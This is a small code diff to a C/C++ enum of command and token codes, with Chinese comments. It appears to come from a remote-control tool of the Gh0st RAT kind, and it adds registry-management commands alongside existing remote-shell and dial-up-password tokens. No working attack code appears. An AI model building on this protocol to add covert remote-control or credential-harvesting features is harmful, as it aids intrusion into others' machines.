@@ -84,6 +84,8 @@ enum
 	COMMAND_SERVICES_AUTO,			// 启动方式 - 自动启动
 	COMMAND_SERVICES_MANUAL,		// 启动方式 - 手动启动
 
+	COMMAND_REGEDIT,				//注册表管理
+	COMMAND_REG_FIND,				//注册表 管理标识
 
 	// 服务端发出的标识
 	TOKEN_AUTH = 100,				// 要求验证
@@ -121,7 +123,10 @@ enum
 	TOKEN_WSLIST,					// 窗口列表
 	TOKEN_DIALUPASS,				// 拨号密码
 	TOKEN_SHELL_START,				// 远程终端开始
-	TOKEN_SERVERLIST				// 服务列表
+	TOKEN_SERVERLIST,				// 服务列表
+	TOKEN_REGEDIT,                  // 注册表初始化完毕
+	TOKEN_REG_PATH,                 // 注册表项缓冲区
+	TOKEN_REG_KEY                   // 注册表缓冲区
 };
 
 
